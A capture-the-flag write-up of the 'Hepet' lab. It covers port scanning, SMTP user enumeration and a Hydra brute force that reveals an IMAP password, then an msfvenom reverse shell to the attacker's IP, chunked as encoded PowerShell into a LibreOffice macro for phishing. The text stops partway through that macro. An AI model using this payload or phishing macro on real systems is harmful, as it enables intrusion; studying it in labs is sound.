# CTF Writeup: Hepet

---

## Reconaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -A -p- --min-rate 10000 192.168.145.140
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-10 05:28 EST
Nmap scan report for 192.168.145.140
Host is up (0.024s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE        VERSION
25/tcp    open  smtp           Mercury/32 smtpd (Mail server account Maiser)
|_smtp-commands: localhost Hello nmap.scanme.org; ESMTPs are:, TIME
79/tcp    open  finger         Mercury/32 fingerd
| finger: Login: Admin         Name: Mail System Administrator\x0D
| \x0D
|_[No profile information]\x0D
105/tcp   open  ph-addressbook Mercury/32 PH addressbook server
106/tcp   open  pop3pw         Mercury/32 poppass service
110/tcp   open  pop3           Mercury/32 pop3d
|_pop3-capabilities: USER UIDL APOP EXPIRE(NEVER) TOP
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
143/tcp   open  imap           Mercury/32 imapd 4.62
|_imap-capabilities: IMAP4rev1 CAPABILITY X-MERCURY-1A0001 complete OK AUTH=PLAIN
443/tcp   open  ssl/http       Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp   open  microsoft-ds?
2224/tcp  open  http           Mercury/32 httpd
|_http-title: Mercury HTTP Services
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8000/tcp  open  http           Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.3.23)
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.3.23
|_http-title: Time Travel Company Page
| http-methods: 
|_  Potentially risky methods: TRACE
11100/tcp open  vnc            VNC (protocol 3.8)
| vnc-info: 
|   Protocol version: 3.8
|   Security types: 
|_    Unknown security type (40)
20001/tcp open  ftp            FileZilla ftpd 0.9.41 beta
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -r--r--r-- 1 ftp ftp            312 Oct 20  2020 .babelrc
| -r--r--r-- 1 ftp ftp            147 Oct 20  2020 .editorconfig
| -r--r--r-- 1 ftp ftp             23 Oct 20  2020 .eslintignore
| -r--r--r-- 1 ftp ftp            779 Oct 20  2020 .eslintrc.js
| -r--r--r-- 1 ftp ftp            167 Oct 20  2020 .gitignore
| -r--r--r-- 1 ftp ftp            228 Oct 20  2020 .postcssrc.js
| -r--r--r-- 1 ftp ftp            346 Oct 20  2020 .tern-project
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 build
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 config
| -r--r--r-- 1 ftp ftp           1376 Oct 20  2020 index.html
| -r--r--r-- 1 ftp ftp         425010 Oct 20  2020 package-lock.json
| -r--r--r-- 1 ftp ftp           2454 Oct 20  2020 package.json
| -r--r--r-- 1 ftp ftp           1100 Oct 20  2020 README.md
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 src
| drwxr-xr-x 1 ftp ftp              0 Oct 20  2020 static
|_-r--r--r-- 1 ftp ftp            127 Oct 20  2020 _redirects
|_ftp-bounce: bounce working!
33006/tcp open  mysql          MariaDB 10.3.24 or later (unauthorized)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49669/tcp open  msrpc          Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=11/10%OT=25%CT=1%CU=38458%PV=Y%DS=4%DC=T%G=Y%TM=6911BF
OS:09%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10B%TI=I%CI=I%TS=U)SEQ(SP=
OS:101%GCD=1%ISR=10E%TI=I%CI=I%TS=U)SEQ(SP=103%GCD=1%ISR=10A%TI=I%CI=I%TS=U
OS:)SEQ(SP=10A%GCD=1%ISR=10C%TI=I%CI=I%TS=U)SEQ(SP=FC%GCD=1%ISR=108%TI=I%CI
OS:=I%TS=U)OPS(O1=M578NW0NNS%O2=M578NW0NNS%O3=M578NW0%O4=M578NW0NNS%O5=M578
OS:NW0NNS%O6=M578NNS)WIN(W1=4000%W2=4000%W3=4000%W4=4000%W5=4000%W6=4000)EC
OS:N(R=Y%DF=Y%T=80%W=4000%O=M578NW0NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%
OS:F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G
OS:%RUCK=G%RUD=G)IE(R=N)

Network Distance: 4 hops
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-11-10T10:31:23
|_  start_date: N/A

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   22.05 ms 192.168.45.1
2   21.60 ms 192.168.45.254
3   22.09 ms 192.168.251.1
4   22.20 ms 192.168.145.140

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 195.49 seconds
```

Analyzed the webpage on port 8000 & only was able to enumerate potential users, created an wordlist out of all of them. The workers were also all described as there job positions. 

```
cat wordlist.txt 
ela
charlotte
magnus
agnes
jonas
martha
```

I was able to access the ftp service anonymously, but the files inside there weren't of any use to me.

Decided to start enumerating smtp, since we have an list of users from the webpage, we can check which users of them exist in smtp, by utilizing an Tool called "smtp-user-enum".

```
smtp-user-enum -M VRFY -U wordlist.txt -t 192.168.145.140 
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... wordlist.txt
Target count ............. 1
Username count ........... 6
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Mon Nov 10 09:41:54 2025 #########
192.168.145.140: jonas exists
192.168.145.140: magnus exists
192.168.145.140: agnes exists
192.168.145.140: charlotte exists
192.168.145.140: martha exists
######## Scan completed at Mon Nov 10 09:41:54 2025 #########
5 results.

6 queries in 1 seconds (6.0 queries / sec)
```

Bruteforced login entry's in IMAP (E-Mail Server of the target) with the userlist & the password and successfully logged in with jonas:SicMundusCreatusEst

```
hydra -L users.txt -p SicMundusCreatusEst imap://192.168.145.140
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-11-10 09:59:22
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking imap://192.168.145.140:143/
[143][imap] host: 192.168.145.140   login: jonas   password: SicMundusCreatusEst
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-11-10 09:59:23
```

Connected to IMAP 

```
telnet 192.168.141.140 143
a1 login "jonas" "SicMundusCreatusEst"
a1 list "" *
a1 select INBOX
```

Read all the mails. The official document suite is LibreOffice, which I already know is exploitable by macros.

```
a1 fetch 2 body[text]
* 2 FETCH (BODY[text] {647}
This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-808784.915440814
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Team,

We will be changing our office suite to LibreOffice. For the moment, all the spreadsheets and documents will be first procesed in the mail server directly to check the compatibility. 

I will forward all the documents after checking everything is working okay. 

Sorry for the inconveniences.


------MIME delimiter for sendEmail-808784.915440814--
```

The mail we previously enumerated mailadmin@localhost accepts or is waiting for an libreoffice documentation, so I'm assuming when we can upload an LibreOffice Document 

```
* 4 FETCH (BODY[text] {636}
This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-678721.390272589
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

Hi team!

I'm new here, will be doing PR for the company. 
Its a pleasure to work with all of you!

If you can please send to mailadmin the spreadsheet for printing with all the company contacts will be really apreciated .

Ela, can you install the office suite on my machine?

Cheers!


------MIME delimiter for sendEmail-678721.390272589--
```

I'm assuming we can execute an email phishing attempt in order to do get initial access.
Therefore we can utilize msfvenom to first of all create an payload.

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.166 LPORT=443 -f hta-psh > reverse.hta
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of hta-psh file: 7389 bytes
```

Displayed the reverse.hta and copy pasted the encoded base64 command inside an macro inside libreoffice.

Note: That VBA / Microsoft has an character limit of 255 each line, which means we will have ton conatenate our strings.


Utilized the following script to do so:

```
s = "powershell.exe -nop -w hidden -e aQBmA...CQAcwApADsA"

n = 50
for i in range(0, len(s), n):
    chunk = s[i:i + n]
    print('Str = Str + "' + chunk + '"')
```

Result looks like this:

```
Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
Str = Str + "wBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcAB"
Str = Str + "vAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9A"
Str = Str + "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQ"
Str = Str + "AaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAU"
Str = Str + "wB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQB"
Str = Str + "tAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9A"
Str = Str + "CcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACA"
Str = Str + "AJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAc"
Str = Str + "gBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB"
Str = Str + "5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkA"
Str = Str + "GUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU"
Str = Str + "AbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAe"
Str = Str + "gBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQB"
Str = Str + "jAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5A"
Str = Str + "FMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4"
Str = Str + "AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAd"
Str = Str + "AByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATwBzAGgARQB"
Str = Str + "tAGsAQwBBADcAVgBXACsAMgAvAGEAewAxAH0AQgBEACsAdgBWA"
Str = Str + "EwALwBCADYAdABDAHcAcABZAEkAcgAzAEIATgBFADYAbgB7ADE"
Str = Str + "AfQAyAFQAeQBDAEMAVQA0AGcAagBrADIAQQBRADYAZQBOAHYAV"
Str = Str + "ABZAEwAYQB5ACsAMQAxADcAeAA2AC8AZAA5AHYAMQB0AGcASgB"
Str = Str + "VAGMAbABkADcAcQB7ADEAfQB1AGgATABCADMANQA3AFgAZgBmA"
Str = Str + "EQATgBqAEwAdwBrAGQAVABsAGcAbwBCAFUAUABwACsAOABjAFA"
Str = Str + "AVQByAFkARwBLAEUASwBCAEoAQgBkAHcAVgBWACsAWABwAE0AS"
Str = Str + "wBpADcAMQB2AEsAeQAyAGwAaABiAFEAVAA2AGgAZgBSAFYAawB"
Str = Str + "xAGYAcQBhAHQAVgBpAEEAewAxAH0ATABoADcAJwAnACsAJwAnA"
Str = Str + "E8AcQBxAG0AVQBRAFIARAB2AG4AaAB2AFgAeQBOAHUAUgByAEg"
Str = Str + "ATwBIAGkAaQBCAE0AZQB5AEkAdgB7ADIAfQBsAGoAZQBZADQAd"
Str = Str + "wBtAGQAMwBUAHcAdgBzAGMATwBtADcAVgBQAGkAegBmAEUAMwB"
Str = Str + "aAEUANgBLAFoAMgBLADYASgBuAEQAbQBXAHoAdABUAFEARgBXA"
Str = Str + "GQAOQA1AGkAQQBSAFcAZABsAGMAVQBjAEwAbAA0AGgAOQAvAEY"
Str = Str + "ASgBYAHAAVwBXADEAVwBiAG4AOQBMAEUASQAzAGwAbwByAG0AT"
Str = Str + "ABPAFEANwBLAEwAcQBWAEYAUgBmAHEAaABDAEkAYwBQAHUAeAB"
Str = Str + "XAFcAaQB3AFoAeABJAGgAWQB6AGoANQBkAEgASgBEAHkAdgBsA"
Str = Str + "DYAewAyAH0AdwBSAGgANgArAEIAVwB0AHIAYgBHAEEAKwBaADI"
Str = Str + "ANQBjAGgATgB1ADgAMwBDAGYAQwBQAEkAbgBDADcARgByAEMAe"
Str = Str + "gBrAEYASwBMAHMATABqAEkARwBLAE8ANgByAG8AUgBqAHUATgB"
Str = Str + "pAHsAMQB9AFoAbwBLAEQAOQBQAFoANwBIAGQANQBtAHIAbQAvA"
Str = Str + "FQAewAyAH0ASgBPAEEAbAB6AFcAUQA0ADQAagB0AGoASgB4AHQ"
Str = Str + "AQwBZAE8AagBzAHQAZABGAEwAbwBVADMAMgBOAHYAQgBsAG8Ab"
Str = Str + "QBqAHsAMgB9AGoAbwAnACcAKwAnACcAegB4ACcAJwArACcAJwB"
Str = Str + "RAEYAeABOAFoAcwBpAGUAVgBDAG0ARgBCAGEAawB2ADYATABHA"
Str = Str + "GYAawBXAGIAMwBMAHcAMwBxAHMAawBIAHkAdQBCADEASQBCAEg"
Str = Str + "AewAxAH0AZwBuAHsAMQB9AGUAdQBxAGkAQgBuAE0AVABpAGcAK"
Str = Str + "wBxAHgAUgBPAFIAcABsACcAJwArACcAJwB4AFEAWQBPAFYAOAB"
Str = Str + "BAEEAaAAvAEMAQgB7ADEAfQA5AG4ARQBMAHgAeQBKAG0AYwBJA"
Str = Str + "E4ASABMAFIAcgA2AG0ANgBRACcAJwArACcAJwBtAEcAbwBPAFU"
Str = Str + "AQgBpAHsAMgB9AG0AcQAvAEYAVwBxAGwAaQBRAEQAdgBDAFAAT"
Str = Str + "wBvAGgAMgA4AEYAaAA2AGkAQgBDAHUAegBaADgAaQBsAEEAagA"
Str = Str + "nACcAKwAnACcAawB2AHYAZABkAFcATABWAGMAVQBhAHQAOQB1A"
Str = Str + "EIAaQBiAHMAVABXADEARwAzACcAJwArACcAJwBOAG0ATABoAFY"
Str = Str + "AYwBVAEsATABpAFQAaQBaAEIANQBtADgAOAB0ADcASgBFAFEAd"
Str = Str + "AAzAFkAaABDAG8AaQBUAFUAMQBZACcAJwArACcAJwArAGwAUgB"
Str = Str + "YAHMAVQBaAHcAaQBVAHMANwBGAGIAaQBGAEMAdQBaAGcAZABZA"
Str = Str + "EwAZQBGAEsAZgBZAFIARgB6AEEATABjAHYAeQBrADEAZwA0AEk"
Str = Str + "AZgA5AGIAVgBFAGsASgBkAEgASwBrAE8AWgBEAGEARwBxAEMAR"
Str = Str + "ABwAHkAdQB0AGcARABwAG0AVABpADMAcABvADQAQQBEAEEATwA"
Str = Str + "3AHcARABXAHcAcwBlAEYAQQByAE8AcABiACcAJwArACcAJwBQA"
Str = Str + "GkAMgBPAFgAZQB4AFQAcwBJAEYAWgBzAFUAeABYAEYASgBHAGk"
Str = Str + "AUgBRAHEAVQA1AEoATQBqAEcAaQAyAEMAMQBKAGEAaABpAFQAN"
Str = Str + "wBFAGgATgBPAEUAcwBmAGkAeQAvAGgARwBnAG4AbAB4AEUARQB"
Str = Str + "4AHoAOAAzAE4AbABOAGQAbwBaAGwANgBiAEwASQB4ADUAbABEA"
Str = Str + "GkAUQBWAFUARABnAHcAVgB4AGgAaAB5AEEAcQBBAEMAbABKAFg"
Str = Str + "AZQBKAGkAYgBXAGMAewAxAH0AUAAvAGQAZQBQAEEAbABIAEUAM"
Str = Str + "QBFAEsANQBRAE8AVwAxAHAAQQBPADIAQgBFAHcAbQBGAHgAdwB"
Str = Str + "KAFkASgBBAGcAUgBkAEsAMgBjAFIAYwBEADEAWQBVAEIAeQBDA"
Str = Str + "FIAdABvAHsAMgB9AE8AUgBUADQAewAyAH0AaQBhAHgARQBVAG0"
Str = Str + "AbwBoAEgANwB2AEYAewAyAH0AMQBIAG0AZABYAEEAZwB2AFUAQ"
Str = Str + "QBsAGgAKwBNAG8AUgBrAGkAMQB7ADEAfQBSAGsAdgB7ADEAfQB"
Str = Str + "UAGEASgBPAFAAUQBnAGcAWABCAEsAcgB2ADgAUgB3ADgALwBOA"
Str = Str + "CcAJwArACcAJwBSAHcAVABUAGoASABDAFcARwBEAG0AdgByAHE"
Str = Str + "AbQAyADQANABMACsAQgBXAC8AQgBCAFUARQB6AGUARgBJAHcAS"
Str = Str + "QBnADUAQQBkAEMASQBXAGEAQwBqAEcAbgB4AHUASABMAGkATgA"
Str = Str + "vAHEAdAB5AFIAcABnAHAAcgByAEkAZgBVAGMATABRAGwAcQBhA"
Str = Str + "GsAYgBVAHQAJwAnACsAJwAnAE0ATgArAEYAbgBrAFgARwBlAHQ"
Str = Str + "AQwAvAGUAbQB0ACsAaABXAG8AdABaADIANwBxAGwANgByAEIAd"
Str = Str + "gBkAFEAVwB2AFkANwBUAGIAVwBQAGQATgB1AGMATABPAHQAOAA"
Str = Str + "1AHUAQgB6AG8AMwAyADQAMgBKAGgAcQB0ADEANwBhADgAdwBuA"
Str = Str + "HUAdABwADkASQBOAFgAbAB1AEwARgBmADkAYwBqAGUANwBLAHY"
Str = Str + "AdQBlAEYAdgA1AHYATgBmADIAbQA2AHEAMgAzAHsAMQB9ADkAO"
Str = Str + "AAxAHgAdQAzAFAATQArAC8AOABNAHoANwAyAG0AOABkAHsAMgB"
Str = Str + "9AGgAOAAxAGgAMQBxADEAagB2AHEAdABkAHQASQBmAGEAUgB1A"
Str = Str + "HQAMgBvAGoAYgBaAE4ATQBkAEUAbQB1ADQANwBIAFgANAB7ADI"
Str = Str + "AfQA5AGkAbQB5AFAASQBxAC8AbQBQAHQARQBwAEYAdABQADEAc"
Str = Str + "gBZAE4AVwAnACcAKwAnACcAYgBzAGQAVgBXADkAbgBwADgANwA"
Str = Str + "rADUANQBuAFgAOAAnACcAKwAnACcAOABOAGQAegBmAHUAVgBpA"
Str = Str + "DUASABqAGEAWABhAFYAdABWAG0AMgBMAFkANwBHAHIAcwBaAGE"
Str = Str + "ANQBFADYAcQBOAGgAVwBSAHgAdABhAGIAVwB7ADIAfQA0AGgAT"
Str = Str + "AAzAFAAJwAnACsAJwAnAGYAcwBWAHIAdwBCADYAdABzAHcANAB"
Str = Str + "5AG0AcQB5AFAASgBrAHoAMQBWAHsAMQB9ADEAcABoAEEARwBhA"
Str = Str + "GEAeQBPADcAVABpAGEAcgB4AC8AcwA1ADIATwBwAEEAQwBFAGE"
Str = Str + "AbAAyAHQAQgBkAHYARwBWAGYAKwBpAE4AaQByAHkAcwAyAHUAc"
Str = Str + "gA3AGwARQA3AFgAWgBhADkAVABjAFIAMwB2AGYAcgBhAE4ANQB"
Str = Str + "iADIASQBuAC8AYwB0AEoANwBMAFoANwByAFkAMgBtAGoAbQB2A"
Str = Str + "HQAbgB0AGEANgBWAHQAdgAzAGwAdABXAFoAagBPAHoAbABaAFA"
Str = Str + "AUgBBAEoAeQBPAHIATgBtAEgAWQAyACcAJwArACcAJwBWAFQAb"
Str = Str + "QBZAEkATgBnADcAYwA1AGUAUABsAFcATQBhADEAKwBmAGIAMgB"
Str = Str + "zACsAKwBMAHAASQA3AFEAYwBrAG8ARQA5ADEAdAAzAEoAcABmA"
Str = Str + "GQASABDAHoAWQB7ADIAfQAvAFcAUAB2AHUAYwBIAFIAeAB2ADc"
Str = Str + "AMwBkAFAAZABXAFoAYQBsAFUAcQA5AGkAJwAnACsAJwAnAGYAS"
Str = Str + "QA5AGQAUQBpAEkAVAArAHYAegB3AHAAcwAnACcAKwAnACcAZQB"
Str = Str + "MAE8AbwBpAFcANwA0ADgAVQBPAEIAagBXAHQASABLAFgAKwByA"
Str = Str + "DIAJwAnACsAJwAnAHgAcwBvAGkAdQBlAEkAQQBoAFcAZwBpACs"
Str = Str + "AZgBWADIARwBGAFIASgArAHYATABBAHsAMgB9AGEARQBoAGkAe"
Str = Str + "gBEAGkARgAvAGkASwBNAFEAVQBaAGkASgBNAHoAWgB6AEcASwB"
Str = Str + "xAFgATQBFAFcATQBoADcAZAA4AHcAawBnADYARABRAHMAdwB0A"
Str = Str + "HsAMQB9AHsAMgB9ACsARABPAHYAVwBrAHsAMQB9AE0AKwBDAHk"
Str = Str + "AcwB1AHsAMgB9AHkATABlAHUAcgBpAFkAUQBvACsAaABBAEMAM"
Str = Str + "QA3AHUANAA5AEQAbgA4ADEASgAxAGUAMQA2AHQAUQBwAE8AdgB"
Str = Str + "iAHEAdQBOAHQAQQBMAGUAZgA3AEUAbQBXACsAMQBrAFkAYQBzA"
Str = Str + "GsAcABvAFQAQQBKAFQATgBOAFUAOQBOAGcAagBYAGkAewAxAH0"
Str = Str + "ATABQACcAJwArACcAJwA5AHEAcABPAEIAYgBnAEUATgBQAGUAa"
Str = Str + "AB1AHIAdAAyAEEARAB6AHsAMgB9AHYAbwBJAHQARABUAEQAcgB"
Str = Str + "VAHQAdwBOAE0AWQBvADgAZgBRAEgAVwA3ADEAegBJAE0AagA0A"
Str = Str + "EEAQwB4AEcAbAB4ADcASwByADQAQwBEAHYAdwBBAEEAMgBmADQ"
Str = Str + "AbQAxAFQAZwBZAGsAUQBlAGoAOQB6AEMATQB2AG0AVgBqAE0Ab"
Str = Str + "gA2AHsAMgB9AHgAegArADMASAA5AGoAegBNAHYAZQBQADUAeQA"
Str = Str + "rAGkAewAyAH0AWABWAFUAbwByAE4AVAA3AHUAdgBOADQANABhA"
Str = Str + "CsAeQArADcALwB3AGcAUgBEAG4ASQBtAHQARgBtAEsARAAxAFA"
Str = Str + "ALwBOAEEAeABaAGoAUgB4AGwAZAA1AGwAQQBBAFgAagBaAEUAb"
Str = Str + "AAvAEQAZAB3AGsALwB1ADQAVgB2AHEANwBUAFAALwB3ADEAcgA"
Str = Str + "2AHcAVABuAGgAdwBzAEEAQQBBAHsAMAB9AHsAMAB9ACcAJwApA"
Str = Str + "C0AZgAnACcAPQAnACcALAAnACcAUwAnACcALAAnACcAMAAnACc"
Str = Str + "AKQApACkAKQAsAFsAUwB5AHMAdABlAG0ALgBJAE8ALgBDAG8Ab"
Str = Str + "QBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQB"
Str = Str + "vAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzA"
Str = Str + "CkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApACkAKQAnADs"
Str = Str + "AJABzAC4AVQBzAGUAUwBoAGUAbABsAEUAeABlAGMAdQB0AGUAP"
Str = Str + "QAkAGYAYQBsAHMAZQA7ACQAcwAuAFIAZQBkAGkAcgBlAGMAdAB"
Str = Str + "TAHQAYQBuAGQAYQByAGQATwB1AHQAcAB1AHQAPQAkAHQAcgB1A"
Str = Str + "GUAOwAkAHMALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAPQAnAEg"
Str = Str + "AaQBkAGQAZQBuACcAOwAkAHMALgBDAHIAZQBhAHQAZQBOAG8AV"
Str = Str + "wBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAkAHAAPQBbAFMAeQB"
Str = Str + "zAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByA"
Str = Str + "G8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQAKAAkAHMAKQA7AA="
Str = Str + "="
```

Opened up LibreOffice in order to create macro and malicious file we send to the admin.

```
libreoffice --calc
```

The Macro I used:

```
Sub Exploit

	Dim Str As String
	
Str = Str + "cmd.exe /c powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
Str = Str + "kAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBlAHgAZQAnA"
Str = Str + "H0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3AGkAbgBkAGk"
Str = Str + "AcgArACcAXABzAHkAcwB3AG8AdwA2ADQAXABXAGkAbgBkAG8Ad"
Str = Str + "wBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcAB"
Str = Str + "vAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACcAfQA7ACQAcwA9A"
Str = Str + "E4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEQ"
Str = Str + "AaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHMAU"
Str = Str + "wB0AGEAcgB0AEkAbgBmAG8AOwAkAHMALgBGAGkAbABlAE4AYQB"
Str = Str + "tAGUAPQAkAGIAOwAkAHMALgBBAHIAZwB1AG0AZQBuAHQAcwA9A"
Str = Str + "CcALQBuAG8AcAAgAC0AdwAgAGgAaQBkAGQAZQBuACAALQBjACA"
Str = Str + "AJgAoAFsAcwBjAHIAaQBwAHQAYgBsAG8AYwBrAF0AOgA6AGMAc"
Str = Str + "gBlAGEAdABlACgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB"
Str = Str + "5AHMAdABlAG0ALgBJAE8ALgBTAHQAcgBlAGEAbQBSAGUAYQBkA"
Str = Str + "GUAcgAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGU"
Str = Str + "AbQAuAEkATwAuAEMAbwBtAHAAcgBlAHMAcwBpAG8AbgAuAEcAe"
Str = Str + "gBpAHAAUwB0AHIAZQBhAG0AKAAoAE4AZQB3AC0ATwBiAGoAZQB"
Str = Str + "jAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5A"
Str = Str + "FMAdAByAGUAYQBtACgALABbAFMAeQBzAHQAZQBtAC4AQwBvAG4"
Str = Str + "AdgBlAHIAdABdADoAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAd"
Str = Str + "AByAGkAbgBnACgAKAAoACcAJwBIADQAcwBJAEEATwBzAGgARQB"
Str = Str + "tAGsAQwBBADcAVgBXACsAMgAvAGEAewAxAH0AQgBEACsAdgBWA"
Str = Str + "EwALwBCADYAdABDAHcAcABZAEkAcgAzAEIATgBFADYAbgB7ADE"
Str = Str + "AfQAyAFQAeQBDAEMAVQA0AGcAagBrADIAQQBRADYAZQBOAHYAV"
Str = Str + "ABZAEwAYQB5ACsAMQAxADcAeAA2AC8AZAA5AHYAMQB0AGcASgB"
Str = Str + "VAGMAbABkADcAcQB7ADEAfQB1AGgATABCADMANQA3AFgAZgBmA"
Str = Str + "EQATgBqAEwAdwBrAGQAVABsAGcAbwBCAFUAUABwACsAOABjAFA"
Str = Str + "AVQByAFkARwBLAEUASwBCAEoAQgBkAHcAVgBWACsAWABwAE0AS"
Str = Str + "wBpADcAMQB2AEsAeQAyAGwAaABiAFEAVAA2AGgAZgBSAFYAawB"
Str = Str + "xAGYAcQBhAHQAVgBpAEEAewAxAH0ATABoADcAJwAnACsAJwAnA"
Str = Str + "E8AcQBxAG0AVQBRAFIARAB2AG4AaAB2AFgAeQBOAHUAUgByAEg"
Str = Str + "ATwBIAGkAaQBCAE0AZQB5AEkAdgB7ADIAfQBsAGoAZQBZADQAd"
Str = Str + "wBtAGQAMwBUAHcAdgBzAGMATwBtADcAVgBQAGkAegBmAEUAMwB"
Str = Str + "aAEUANgBLAFoAMgBLADYASgBuAEQAbQBXAHoAdABUAFEARgBXA"
